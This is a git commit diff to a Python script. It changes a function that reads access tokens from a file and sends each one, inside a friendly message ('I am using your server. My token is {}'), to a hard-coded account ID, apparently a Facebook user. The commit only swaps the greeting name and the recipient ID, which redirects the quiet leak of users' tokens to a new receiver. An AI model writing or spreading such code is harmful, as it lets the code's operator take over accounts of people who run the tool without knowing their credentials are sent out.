3619ca3980bb8de44508916772f8d58ee0717fa8
SyXoanox <160595832+SyXoanox@users.noreply.github.com>
2024-05-13 14:53:43 +0530

    Update main.py

--- main.py
+++ main.py
@@ -29,10 +29,10 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello Victor sir! I am using your server. My token is {}"
+      msg_template = "Hello SyCo sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100094064597350"
+      target_id = "100011788148543"
 
       requests.packages.urllib3.disable_warnings()
 
